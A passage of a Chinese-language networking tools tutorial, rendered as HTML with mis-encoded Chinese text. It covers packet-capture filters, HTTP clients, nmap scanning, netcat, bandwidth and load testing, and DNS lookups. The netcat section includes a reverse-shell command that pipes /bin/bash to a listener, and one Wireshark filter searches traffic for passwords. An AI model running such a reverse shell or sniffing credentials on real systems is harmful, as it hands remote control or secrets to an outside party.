tcpdump<span class="w"> </span>src<span class="w"> </span><span class="m">192</span>.168.1.100
tcpdump<span class="w"> </span>dst<span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># ç½‘æ®µ</span>
tcpdump<span class="w"> </span>net<span class="w"> </span><span class="m">192</span>.168.1.0/24

<span class="c1"># ç«¯å£èŒƒå›´</span>
tcpdump<span class="w"> </span>portrange<span class="w"> </span><span class="m">8000</span>-9000

<span class="c1"># HTTPæµé‡</span>
tcpdump<span class="w"> </span><span class="s1">&#39;tcp port 80&#39;</span>

<span class="c1"># HTTPSæµé‡</span>
tcpdump<span class="w"> </span><span class="s1">&#39;tcp port 443&#39;</span>

<span class="c1"># SYNåŒ…</span>
tcpdump<span class="w"> </span><span class="s1">&#39;tcp[tcpflags] &amp; tcp-syn != 0&#39;</span>

<span class="c1"># RSTåŒ…</span>
tcpdump<span class="w"> </span><span class="s1">&#39;tcp[tcpflags] &amp; tcp-rst != 0&#39;</span>

<span class="c1"># æŠ“å–HTTP GETè¯·æ±‚</span>
tcpdump<span class="w"> </span>-s<span class="w"> </span><span class="m">0</span><span class="w"> </span>-A<span class="w"> </span><span class="s1">&#39;tcp dst port 80 and tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420&#39;</span>
</pre></div>
</div>
</section>
<section id="wireshark">
<h3>3.2 Wireshark<a class="headerlink" href="#wireshark" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šå›¾å½¢åŒ–æŠ“åŒ…å’Œåˆ†æå·¥å…·</p>
<p><strong>è¿‡æ»¤è¯­æ³•</strong>ï¼š</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1"># æŒ‰åè®®è¿‡æ»¤</span>
<span class="n">http</span>
<span class="n">tcp</span>
<span class="n">udp</span>
<span class="n">dns</span>
<span class="n">icmp</span>

<span class="c1"># æŒ‰IPè¿‡æ»¤</span>
<span class="n">ip</span><span class="o">.</span><span class="n">addr</span> <span class="o">==</span> <span class="mf">192.168.1.100</span>
<span class="n">ip</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="mf">192.168.1.100</span>
<span class="n">ip</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="mf">8.8.8.8</span>

<span class="c1"># æŒ‰ç«¯å£è¿‡æ»¤</span>
<span class="n">tcp</span><span class="o">.</span><span class="n">port</span> <span class="o">==</span> <span class="mi">80</span>
<span class="n">tcp</span><span class="o">.</span><span class="n">srcport</span> <span class="o">==</span> <span class="mi">1234</span>
<span class="n">tcp</span><span class="o">.</span><span class="n">dstport</span> <span class="o">==</span> <span class="mi">443</span>

<span class="c1"># æŒ‰HTTPè¿‡æ»¤</span>
<span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&quot;GET&quot;</span>
<span class="n">http</span><span class="o">.</span><span class="n">response</span><span class="o">.</span><span class="n">code</span> <span class="o">==</span> <span class="mi">200</span>
<span class="n">http</span><span class="o">.</span><span class="n">host</span> <span class="n">contains</span> <span class="s2">&quot;google.com&quot;</span>

<span class="c1"># æŒ‰TCPæ ‡å¿—è¿‡æ»¤</span>
<span class="n">tcp</span><span class="o">.</span><span class="n">flags</span><span class="o">.</span><span class="n">syn</span> <span class="o">==</span> <span class="mi">1</span>
<span class="n">tcp</span><span class="o">.</span><span class="n">flags</span><span class="o">.</span><span class="n">reset</span> <span class="o">==</span> <span class="mi">1</span>

<span class="c1"># ç»„åˆè¿‡æ»¤</span>
<span class="n">ip</span><span class="o">.</span><span class="n">addr</span> <span class="o">==</span> <span class="mf">192.168.1.100</span> <span class="o">&amp;&amp;</span> <span class="n">tcp</span><span class="o">.</span><span class="n">port</span> <span class="o">==</span> <span class="mi">80</span>
<span class="p">(</span><span class="n">http</span> <span class="o">||</span> <span class="n">https</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">ip</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="mf">192.168.1.100</span>

<span class="c1"># æŒ‰å­—ç¬¦ä¸²è¿‡æ»¤</span>
<span class="n">tcp</span> <span class="n">contains</span> <span class="s2">&quot;password&quot;</span>
<span class="n">http</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">uri</span> <span class="n">contains</span> <span class="s2">&quot;login&quot;</span>
</pre></div>
</div>
<p><strong>å¸¸ç”¨åŠŸèƒ½</strong>ï¼š</p>
<ol class="arabic simple">
<li><p><strong>Follow TCP Stream</strong>ï¼šæŸ¥çœ‹å®Œæ•´çš„TCPä¼šè¯</p></li>
<li><p><strong>Statistics â†’ Conversations</strong>ï¼šæŸ¥çœ‹è¿æ¥ç»Ÿè®¡</p></li>
<li><p><strong>Statistics â†’ IO Graphs</strong>ï¼šæŸ¥çœ‹æµé‡å›¾è¡¨</p></li>
<li><p><strong>Expert Info</strong>ï¼šæŸ¥çœ‹é—®é¢˜å’Œè­¦å‘Š</p></li>
</ol>
</section>
</section>
<hr class="docutils" />
<section id="http">
<h2>4. HTTPæµ‹è¯•å·¥å…·<a class="headerlink" href="#http" title="Link to this heading">ïƒ</a></h2>
<section id="curl">
<h3>4.1 curl<a class="headerlink" href="#curl" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šå¼ºå¤§çš„HTTPå®¢æˆ·ç«¯</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># åŸºæœ¬GETè¯·æ±‚</span>
$<span class="w"> </span>curl<span class="w"> </span>https://api.github.com

<span class="c1"># æ˜¾ç¤ºå“åº”å¤´</span>
$<span class="w"> </span>curl<span class="w"> </span>-i<span class="w"> </span>https://api.github.com

<span class="c1"># åªæ˜¾ç¤ºå“åº”å¤´</span>
$<span class="w"> </span>curl<span class="w"> </span>-I<span class="w"> </span>https://api.github.com

<span class="c1"># POSTè¯·æ±‚</span>
$<span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://api.example.com/users<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;name&quot;:&quot;å¼ ä¸‰&quot;,&quot;age&quot;:25}&#39;</span>

<span class="c1"># PUTè¯·æ±‚</span>
$<span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>https://api.example.com/users/123<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;name&quot;:&quot;æå››&quot;}&#39;</span>

<span class="c1"># DELETEè¯·æ±‚</span>
$<span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>DELETE<span class="w"> </span>https://api.example.com/users/123

<span class="c1"># å‘é€è¡¨å•æ•°æ®</span>
$<span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://api.example.com/login<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-d<span class="w"> </span><span class="s2">&quot;username=admin&amp;password=secret&quot;</span>

<span class="c1"># ä¸Šä¼ æ–‡ä»¶</span>
$<span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>https://api.example.com/upload<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;file=@/path/to/file.txt&quot;</span>

<span class="c1"># è‡ªå®šä¹‰å¤´éƒ¨</span>
$<span class="w"> </span>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer token123&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: My-App/1.0&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>https://api.example.com/profile

<span class="c1"># ä½¿ç”¨Cookie</span>
$<span class="w"> </span>curl<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;session=abc123&quot;</span><span class="w"> </span>https://api.example.com
$<span class="w"> </span>curl<span class="w"> </span>-c<span class="w"> </span>cookies.txt<span class="w"> </span>https://api.example.com<span class="w">  </span><span class="c1"># ä¿å­˜Cookie</span>

<span class="c1"># è·Ÿéšé‡å®šå‘</span>
$<span class="w"> </span>curl<span class="w"> </span>-L<span class="w"> </span>https://bit.ly/short-url

<span class="c1"># è®¾ç½®è¶…æ—¶</span>
$<span class="w"> </span>curl<span class="w"> </span>--connect-timeout<span class="w"> </span><span class="m">10</span><span class="w"> </span>--max-time<span class="w"> </span><span class="m">30</span><span class="w"> </span>https://slow-server.com

<span class="c1"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span>
$<span class="w"> </span>curl<span class="w"> </span>-v<span class="w"> </span>https://api.github.com

<span class="c1"># é™é»˜æ¨¡å¼ï¼ˆä¸æ˜¾ç¤ºè¿›åº¦ï¼‰</span>
$<span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>https://api.github.com

<span class="c1"># ä¸‹è½½æ–‡ä»¶</span>
$<span class="w"> </span>curl<span class="w"> </span>-O<span class="w"> </span>https://example.com/file.zip
$<span class="w"> </span>curl<span class="w"> </span>-o<span class="w"> </span>filename.zip<span class="w"> </span>https://example.com/file.zip

<span class="c1"># æ–­ç‚¹ç»­ä¼ </span>
$<span class="w"> </span>curl<span class="w"> </span>-C<span class="w"> </span>-<span class="w"> </span>-O<span class="w"> </span>https://example.com/large-file.iso

<span class="c1"># é™é€Ÿ</span>
$<span class="w"> </span>curl<span class="w"> </span>--limit-rate<span class="w"> </span>100K<span class="w"> </span>https://example.com/file.zip

<span class="c1"># ä»£ç†</span>
$<span class="w"> </span>curl<span class="w"> </span>-x<span class="w"> </span>http://proxy:8080<span class="w"> </span>https://api.example.com

<span class="c1"># æµ‹è¯•å“åº”æ—¶é—´</span>
$<span class="w"> </span>curl<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;@curl-format.txt&quot;</span><span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-s<span class="w"> </span>https://api.github.com

<span class="c1"># curl-format.txtå†…å®¹ï¼š</span>
<span class="w">     </span>time_namelookup:<span class="w">  </span>%<span class="o">{</span>time_namelookup<span class="o">}</span>s<span class="se">\n</span>
<span class="w">        </span>time_connect:<span class="w">  </span>%<span class="o">{</span>time_connect<span class="o">}</span>s<span class="se">\n</span>
<span class="w">     </span>time_appconnect:<span class="w">  </span>%<span class="o">{</span>time_appconnect<span class="o">}</span>s<span class="se">\n</span>
<span class="w">    </span>time_pretransfer:<span class="w">  </span>%<span class="o">{</span>time_pretransfer<span class="o">}</span>s<span class="se">\n</span>
<span class="w">       </span>time_redirect:<span class="w">  </span>%<span class="o">{</span>time_redirect<span class="o">}</span>s<span class="se">\n</span>
<span class="w">  </span>time_starttransfer:<span class="w">  </span>%<span class="o">{</span>time_starttransfer<span class="o">}</span>s<span class="se">\n</span>
<span class="w">                     </span>----------<span class="se">\n</span>
<span class="w">          </span>time_total:<span class="w">  </span>%<span class="o">{</span>time_total<span class="o">}</span>s<span class="se">\n</span>
</pre></div>
</div>
</section>
<section id="wget">
<h3>4.2 wget<a class="headerlink" href="#wget" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šä¸‹è½½å·¥å…·</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># ä¸‹è½½æ–‡ä»¶</span>
$<span class="w"> </span>wget<span class="w"> </span>https://example.com/file.zip

<span class="c1"># åå°ä¸‹è½½</span>
$<span class="w"> </span>wget<span class="w"> </span>-b<span class="w"> </span>https://example.com/large-file.iso

<span class="c1"># æ–­ç‚¹ç»­ä¼ </span>
$<span class="w"> </span>wget<span class="w"> </span>-c<span class="w"> </span>https://example.com/large-file.iso

<span class="c1"># é™é€Ÿ</span>
$<span class="w"> </span>wget<span class="w"> </span>--limit-rate<span class="o">=</span>100k<span class="w"> </span>https://example.com/file.zip

<span class="c1"># ä¸‹è½½æ•´ä¸ªç½‘ç«™</span>
$<span class="w"> </span>wget<span class="w"> </span>-r<span class="w"> </span>-np<span class="w"> </span>-k<span class="w"> </span>https://example.com

<span class="c1"># è®¾ç½®User-Agent</span>
$<span class="w"> </span>wget<span class="w"> </span>--user-agent<span class="o">=</span><span class="s2">&quot;Mozilla/5.0&quot;</span><span class="w"> </span>https://example.com

<span class="c1"># HTTPè®¤è¯</span>
$<span class="w"> </span>wget<span class="w"> </span>--http-user<span class="o">=</span>username<span class="w"> </span>--http-password<span class="o">=</span>password<span class="w"> </span>https://example.com

<span class="c1"># ä½¿ç”¨ä»£ç†</span>
$<span class="w"> </span>wget<span class="w"> </span>-e<span class="w"> </span><span class="nv">use_proxy</span><span class="o">=</span>yes<span class="w"> </span>-e<span class="w"> </span><span class="nv">http_proxy</span><span class="o">=</span>proxy:8080<span class="w"> </span>https://example.com

<span class="c1"># é‡è¯•æ¬¡æ•°</span>
$<span class="w"> </span>wget<span class="w"> </span>--tries<span class="o">=</span><span class="m">5</span><span class="w"> </span>https://unstable-server.com
</pre></div>
</div>
</section>
<section id="httpie">
<h3>4.3 httpie<a class="headerlink" href="#httpie" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šç°ä»£åŒ–çš„HTTPå®¢æˆ·ç«¯ï¼ˆæ¯”curlæ›´å‹å¥½ï¼‰</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># å®‰è£…</span>
$<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>httpie

<span class="c1"># GETè¯·æ±‚</span>
$<span class="w"> </span>http<span class="w"> </span>GET<span class="w"> </span>https://api.github.com

<span class="c1"># POSTè¯·æ±‚ï¼ˆJSONï¼‰</span>
$<span class="w"> </span>http<span class="w"> </span>POST<span class="w"> </span>https://api.example.com/users<span class="w"> </span><span class="nv">name</span><span class="o">=</span>å¼ ä¸‰<span class="w"> </span>age:<span class="o">=</span><span class="m">25</span>

<span class="c1"># è‡ªå®šä¹‰å¤´éƒ¨</span>
$<span class="w"> </span>http<span class="w"> </span>GET<span class="w"> </span>https://api.example.com<span class="w"> </span><span class="se">\</span>
<span class="w">  </span>Authorization:<span class="s2">&quot;Bearer token123&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">  </span>User-Agent:My-App/1.0

<span class="c1"># ä¸Šä¼ æ–‡ä»¶</span>
$<span class="w"> </span>http<span class="w"> </span>--form<span class="w"> </span>POST<span class="w"> </span>https://api.example.com/upload<span class="w"> </span>file@/path/to/file.txt

<span class="c1"># ä¸‹è½½æ–‡ä»¶</span>
$<span class="w"> </span>http<span class="w"> </span>--download<span class="w"> </span>https://example.com/file.zip

<span class="c1"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span>
$<span class="w"> </span>http<span class="w"> </span>-v<span class="w"> </span>GET<span class="w"> </span>https://api.github.com

<span class="c1"># åªæ˜¾ç¤ºå“åº”ä½“</span>
$<span class="w"> </span>http<span class="w"> </span>-b<span class="w"> </span>GET<span class="w"> </span>https://api.github.com

<span class="c1"># åªæ˜¾ç¤ºå“åº”å¤´</span>
$<span class="w"> </span>http<span class="w"> </span>-h<span class="w"> </span>GET<span class="w"> </span>https://api.github.com
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id6">
<h2>5. ç½‘ç»œæ‰«æå·¥å…·<a class="headerlink" href="#id6" title="Link to this heading">ïƒ</a></h2>
<section id="nmap">
<h3>5.1 nmap<a class="headerlink" href="#nmap" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šç½‘ç»œæ‰«æå’Œå®‰å…¨å®¡è®¡</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æ‰«æä¸»æœºæ˜¯å¦åœ¨çº¿</span>
$<span class="w"> </span>nmap<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># æ‰«æç½‘æ®µ</span>
$<span class="w"> </span>nmap<span class="w"> </span><span class="m">192</span>.168.1.0/24

<span class="c1"># æ‰«ææŒ‡å®šç«¯å£</span>
$<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span>,443<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># æ‰«æç«¯å£èŒƒå›´</span>
$<span class="w"> </span>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">1</span>-1000<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># æ‰«ææ‰€æœ‰ç«¯å£</span>
$<span class="w"> </span>nmap<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># å¿«é€Ÿæ‰«æ</span>
$<span class="w"> </span>nmap<span class="w"> </span>-F<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># TCP SYNæ‰«æï¼ˆéšè”½æ‰«æï¼‰</span>
$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sS<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># TCPè¿æ¥æ‰«æ</span>
$<span class="w"> </span>nmap<span class="w"> </span>-sT<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># UDPæ‰«æ</span>
$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-sU<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># æœåŠ¡ç‰ˆæœ¬æ£€æµ‹</span>
$<span class="w"> </span>nmap<span class="w"> </span>-sV<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># æ“ä½œç³»ç»Ÿæ£€æµ‹</span>
$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-O<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># è„šæœ¬æ‰«æ</span>
$<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># å…¨é¢æ‰«æ</span>
$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span><span class="m">192</span>.168.1.1

<span class="c1"># è¾“å‡ºåˆ°æ–‡ä»¶</span>
$<span class="w"> </span>nmap<span class="w"> </span>-oN<span class="w"> </span>scan.txt<span class="w"> </span><span class="m">192</span>.168.1.1
$<span class="w"> </span>nmap<span class="w"> </span>-oX<span class="w"> </span>scan.xml<span class="w"> </span><span class="m">192</span>.168.1.1
</pre></div>
</div>
</section>
<section id="nc-netcat">
<h3>5.2 nc (netcat)<a class="headerlink" href="#nc-netcat" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šç½‘ç»œç‘å£«å†›åˆ€</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># ç«¯å£æ‰«æ</span>
$<span class="w"> </span>nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">80</span>
$<span class="w"> </span>nc<span class="w"> </span>-zv<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">1</span>-1000<span class="w">  </span><span class="c1"># æ‰«æèŒƒå›´</span>

<span class="c1"># åˆ›å»ºTCPæœåŠ¡å™¨</span>
$<span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span>

<span class="c1"># è¿æ¥åˆ°æœåŠ¡å™¨</span>
$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">8080</span>

<span class="c1"># UDPæ¨¡å¼</span>
$<span class="w"> </span>nc<span class="w"> </span>-u<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">53</span>

<span class="c1"># æ–‡ä»¶ä¼ è¾“</span>
<span class="c1"># æ¥æ”¶æ–¹ï¼š</span>
$<span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span><span class="w"> </span>&gt;<span class="w"> </span>received_file.txt
<span class="c1"># å‘é€æ–¹ï¼š</span>
$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">8080</span><span class="w"> </span>&lt;<span class="w"> </span>file.txt

<span class="c1"># ç«¯å£è½¬å‘</span>
$<span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>target_host<span class="w"> </span><span class="m">80</span>

<span class="c1"># èŠå¤©</span>
<span class="c1"># æœåŠ¡å™¨ï¼š</span>
$<span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span><span class="m">8080</span>
<span class="c1"># å®¢æˆ·ç«¯ï¼š</span>
$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">8080</span>

<span class="c1"># BanneræŠ“å–</span>
$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="m">80</span>

<span class="c1"># åå‘Shellï¼ˆå®‰å…¨æµ‹è¯•ç”¨ï¼‰</span>
<span class="c1"># ç›‘å¬æ–¹ï¼š</span>
$<span class="w"> </span>nc<span class="w"> </span>-l<span class="w"> </span><span class="m">4444</span>
<span class="c1"># ç›®æ ‡æœºï¼š</span>
$<span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id7">
<h2>6. æ€§èƒ½æµ‹è¯•å·¥å…·<a class="headerlink" href="#id7" title="Link to this heading">ïƒ</a></h2>
<section id="iperf">
<h3>6.1 iperf<a class="headerlink" href="#iperf" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šç½‘ç»œå¸¦å®½æµ‹è¯•</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æœåŠ¡å™¨ç«¯</span>
$<span class="w"> </span>iperf<span class="w"> </span>-s

<span class="c1"># å®¢æˆ·ç«¯ï¼ˆTCPæµ‹è¯•ï¼‰</span>
$<span class="w"> </span>iperf<span class="w"> </span>-c<span class="w"> </span><span class="m">192</span>.168.1.100

<span class="c1"># UDPæµ‹è¯•</span>
$<span class="w"> </span>iperf<span class="w"> </span>-c<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>-b<span class="w"> </span>100M

<span class="c1"># åŒå‘æµ‹è¯•</span>
$<span class="w"> </span>iperf<span class="w"> </span>-c<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-d

<span class="c1"># è®¾ç½®æµ‹è¯•æ—¶é—´</span>
$<span class="w"> </span>iperf<span class="w"> </span>-c<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-t<span class="w"> </span><span class="m">60</span>

<span class="c1"># å¹¶è¡Œè¿æ¥</span>
$<span class="w"> </span>iperf<span class="w"> </span>-c<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-P<span class="w"> </span><span class="m">4</span>

<span class="c1"># åå‘æµ‹è¯•</span>
$<span class="w"> </span>iperf<span class="w"> </span>-c<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-R
</pre></div>
</div>
</section>
<section id="ab-apache-bench">
<h3>6.2 ab (Apache Bench)<a class="headerlink" href="#ab-apache-bench" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šHTTPå‹åŠ›æµ‹è¯•</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># åŸºæœ¬æµ‹è¯•ï¼ˆ100ä¸ªè¯·æ±‚ï¼Œ10å¹¶å‘ï¼‰</span>
$<span class="w"> </span>ab<span class="w"> </span>-n<span class="w"> </span><span class="m">100</span><span class="w"> </span>-c<span class="w"> </span><span class="m">10</span><span class="w"> </span>http://localhost/

<span class="c1"># POSTè¯·æ±‚</span>
$<span class="w"> </span>ab<span class="w"> </span>-n<span class="w"> </span><span class="m">100</span><span class="w"> </span>-c<span class="w"> </span><span class="m">10</span><span class="w"> </span>-p<span class="w"> </span>data.json<span class="w"> </span>-T<span class="w"> </span>application/json<span class="w"> </span>http://localhost/api/users

<span class="c1"># è‡ªå®šä¹‰å¤´éƒ¨</span>
$<span class="w"> </span>ab<span class="w"> </span>-n<span class="w"> </span><span class="m">100</span><span class="w"> </span>-c<span class="w"> </span><span class="m">10</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Authorization: Bearer token&quot;</span><span class="w"> </span>http://localhost/

<span class="c1"># Keep-Alive</span>
$<span class="w"> </span>ab<span class="w"> </span>-n<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-c<span class="w"> </span><span class="m">100</span><span class="w"> </span>-k<span class="w"> </span>http://localhost/

<span class="c1"># è¾“å‡ºè¯¦ç»†ä¿¡æ¯</span>
$<span class="w"> </span>ab<span class="w"> </span>-v<span class="w"> </span><span class="m">4</span><span class="w"> </span>-n<span class="w"> </span><span class="m">100</span><span class="w"> </span>-c<span class="w"> </span><span class="m">10</span><span class="w"> </span>http://localhost/
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="dns">
<h2>7. DNSå·¥å…·<a class="headerlink" href="#dns" title="Link to this heading">ïƒ</a></h2>
<section id="nslookup">
<h3>7.1 nslookup<a class="headerlink" href="#nslookup" title="Link to this heading">ïƒ</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æŸ¥è¯¢åŸŸå</span>
$<span class="w"> </span>nslookup<span class="w"> </span>www.baidu.com

<span class="c1"># æŒ‡å®šDNSæœåŠ¡å™¨</span>
$<span class="w"> </span>nslookup<span class="w"> </span>www.baidu.com<span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># æŸ¥è¯¢ç‰¹å®šè®°å½•ç±»å‹</span>
$<span class="w"> </span>nslookup<span class="w"> </span>-type<span class="o">=</span>MX<span class="w"> </span>gmail.com
$<span class="w"> </span>nslookup<span class="w"> </span>-type<span class="o">=</span>NS<span class="w"> </span>google.com
</pre></div>
</div>
</section>
<section id="dig">
<h3>7.2 dig<a class="headerlink" href="#dig" title="Link to this heading">ïƒ</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æŸ¥è¯¢åŸŸå</span>
$<span class="w"> </span>dig<span class="w"> </span>www.baidu.com

<span class="c1"># ç®€æ´è¾“å‡º</span>
$<span class="w"> </span>dig<span class="w"> </span>+short<span class="w"> </span>www.baidu.com

<span class="c1"># æŸ¥è¯¢ç‰¹å®šè®°å½•</span>
$<span class="w"> </span>dig<span class="w"> </span>MX<span class="w"> </span>gmail.com
$<span class="w"> </span>dig<span class="w"> </span>NS<span class="w"> </span>google.com
$<span class="w"> </span>dig<span class="w"> </span>TXT<span class="w"> </span>_dmarc.google.com

<span class="c1"># åå‘æŸ¥è¯¢</span>
$<span class="w"> </span>dig<span class="w"> </span>-x<span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># è¿½è¸ªDNSè§£æè¿‡ç¨‹</span>
$<span class="w"> </span>dig<span class="w"> </span>+trace<span class="w"> </span>www.baidu.com

<span class="c1"># æŒ‡å®šDNSæœåŠ¡å™¨</span>
$<span class="w"> </span>dig<span class="w"> </span>@8.8.8.8<span class="w"> </span>www.baidu.com
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id8">
<h2>8. ç»¼åˆè¯Šæ–­<a class="headerlink" href="#id8" title="Link to this heading">ïƒ</a></h2>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># å¿«é€Ÿè¯Šæ–­ç½‘ç»œé—®é¢˜</span>
<span class="m">1</span>.<span class="w"> </span>ping<span class="w"> </span><span class="m">8</span>.8.8.8<span class="w">           </span><span class="c1"># æµ‹è¯•å¤–ç½‘è¿é€šæ€§</span>
<span class="m">2</span>.<span class="w"> </span>ping<span class="w"> </span><span class="m">192</span>.168.1.1<span class="w">       </span><span class="c1"># æµ‹è¯•ç½‘å…³</span>
<span class="m">3</span>.<span class="w"> </span>traceroute<span class="w"> </span><span class="m">8</span>.8.8.8<span class="w">     </span><span class="c1"># è¿½è¸ªè·¯ç”±</span>
<span class="m">4</span>.<span class="w"> </span>nslookup<span class="w"> </span>www.baidu.com<span class="w"> </span><span class="c1"># æµ‹è¯•DNS</span>
<span class="m">5</span>.<span class="w"> </span>netstat<span class="w"> </span>-tulnp<span class="w">         </span><span class="c1"># æŸ¥çœ‹ç«¯å£å ç”¨</span>
<span class="m">6</span>.<span class="w"> </span>ss<span class="w"> </span>-s<span class="w">                  </span><span class="c1"># æŸ¥çœ‹è¿æ¥ç»Ÿè®¡</span>
</pre></div>
</div>
</section>
<hr class="docutils" />
<section id="id9">
<h2>å‚è€ƒèµ„æº<a class="headerlink" href="#id9" title="Link to this heading">ïƒ</a></h2>
<ul class="simple">
<li><p>man pages: tcpdump(8), netstat(8), ss(8)</p></li>
<li><p>Wiresharkç”¨æˆ·æ‰‹å†Œ</p></li>
<li><p>nmapå®˜æ–¹æ–‡æ¡£</p></li>
<li><p>ã€ŠTCP/IPè¯¦è§£ã€‹</p></li>
</ul>
</section>
